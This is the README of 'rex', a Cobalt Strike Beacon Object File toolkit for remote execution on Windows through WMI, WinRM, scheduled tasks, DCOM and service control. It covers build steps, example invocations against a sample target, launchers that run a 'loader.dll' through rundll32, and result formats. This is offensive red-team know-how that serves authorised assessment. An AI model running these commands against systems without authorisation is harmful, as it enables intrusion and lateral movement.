# Rex BOF

`rex` exposes Windows remote-execution primitives as native x86 and x64 Beacon
Object Files. Each technique is a separate object, while `rex.cna`
provides one technique-aware command surface and selects the object matching
the current Beacon architecture.

<picture>
  <source media="(prefers-color-scheme: light)" srcset="docs/demo/demo-light.svg">
  <img alt="rex dispatching WMIExec and reporting its remote process identifier" src="docs/demo/demo-dark.svg">
</picture>

## Build and load

Build every technique for both architectures from the repository root:

```sh
make
```

Load `integrations/cna/rex.cna` in Cobalt Strike. The build writes
`rex_<technique>.{x86,x64}.o` beside the CNA so `script_resource` can resolve
the object matching the active Beacon architecture. Generated objects are
ignored by Git and should be rebuilt from source or obtained from a trusted
release.

```text
rex help
rex techniques
rex help preflight
rex help WMIExec
```

## Usage

One invocation operates on one target. The selected technique performs its
read-only preflight before any remote mutation.

```text
rex preflight WMIExec --target 10.0.0.15 --command "whoami.exe /all"
rex WMIExec --target 10.0.0.15 --command "whoami.exe /all"
rex WSManExec --target 10.0.0.15 --program cmd.exe --arguments "/c whoami"
rex SCMCreateService --target 10.0.0.15 --service-name TemporaryService --remote-path "C:\ProgramData\service.exe TemporaryService"
rex SCMChangeService --target 10.0.0.15 --service-name ExistingService --remote-path "C:\ProgramData\service.exe ExistingService"
```

Prefix a normal technique invocation with `preflight` to run the same remote
prerequisite callback, emit `disposition=validated`, and skip execution. The
same technique options remain required because preflight validates the exact
request that would otherwise execute.

Load `rex.cna` and the technique objects from the same build. The wrapper and
objects share a typed request envelope, so mixing versions is unsupported.

`rex` inherits the active Beacon token context. Establish or revert identity
outside this command; the CNA and BOF never accept credentials or change the
operator's token context.

### Launchers

The CNA provides typed built-in and custom launcher contracts for `WMIExec`,
`WSManExec`, `TaskSchedExec`, and `DCOMIShellDispatch2`. Referenced payloads
must already exist on the target; `rex` does not implement a staging pipeline.

```text
rex launchers
rex WMIExec --target 10.0.0.15 --payload-type dll --remote-path "C:\ProgramData\loader.dll" --launcher rundll32.exe --entry-point EntryPoint
rex WSManExec --target 10.0.0.15 --payload-type cpl --remote-path "C:\ProgramData\module.cpl" --launcher control.exe
rex TaskSchedExec --target 10.0.0.15 --task-name TemporaryTask --payload-type dll --remote-path "C:\ProgramData\loader.dll" --launcher rundll32.exe --entry-point EntryPoint
```

Use `--launcher custom`, an absolute `--launcher-program`, and a single-line
`--launcher-arguments` template containing `{remote_path}` for an
operator-defined contract. Optional placeholders are `{entry_point}` and
`{process_id}`. Service techniques instead require a service-compatible
executable, and `WMIProvider` loads its provider DLL directly. See the
[launcher reference](docs/launchers/index.md) for payload contracts and detection
considerations.

See the [BOF documentation](docs/index.md), [technique reference](docs/techniques/index.md),
and [preflight boundary](docs/preflight.md) for arguments, path and Unicode
behavior, identity semantics, and recovery contracts.

## Technique objects

| Selector | Object basename | Remote outcome |
| --- | --- | --- |
| `WMIProvider` | `rex_wmiprovider` | Provider load completed |
| `WMIService` | `rex_wmiservice` | Service start dispatched |
| `WMIExec` | `rex_wmiexec` | Process creation dispatched, with PID |
| `WSManExec` | `rex_wsmanexec` | Shell command completed |
| `TaskSchedExec` | `rex_taskschedexec` | Task run dispatched |
| `DCOMIShellDispatch2` | `rex_dcomishelldispatch2` | Shell execution dispatched |
| `SCMChangeService` | `rex_scmchangeservice` | Service start dispatched |
| `SCMCreateService` | `rex_scmcreateservice` | Service start dispatched |

Each basename has `.x86.o` and `.x64.o` variants. The BOF reports whether a
remote API only accepted work (`dispatched`) or returned a synchronous outcome
(`completed`); it does not equate dispatch with payload success.

## Results and recovery

Results are concise typed transcript lines. Techniques that expose a remote
process identifier include it:

```text
technique=WMIExec target=10.0.0.15 status=succeeded disposition=dispatched source=win32_process_create pid=4280
```

Dynamic recovery values are UTF-8 percent-encoded where whitespace or record
delimiters would otherwise make a `key=value` field ambiguous. See
[transcript output](docs/output.md) for the decoding contract.

The BOF does not automatically undo remote assessment state. Mutating
techniques emit the identifiers and original values required for explicit
recovery, without copying raw command lines. The BOF also does
not stage or delete payload files; the operator owns delivery and artifact
tracking.

## Render the demo

The animation above is generated from `docs/demo/demo.toml` with
[beaconcast](https://github.com/rubyattack3r/beaconcast). Rendering is a local
documentation task and is not part of CI:

```sh
go install github.com/rubyattack3r/beaconcast/cmd/beaconcast@v0.1.0
make demo
```

Commit the scene and its dark/light SVG and GIF outputs together after visual
review.

## Responsible use

Use these capabilities only on systems you own or are explicitly authorized
to assess. The repository's [Acceptable Use Policy](ACCEPTABLE_USE_POLICY.md)
applies.

## License

Copyright 2026 rubyattack3r. Licensed under the repository's
[Apache License 2.0](LICENSE).
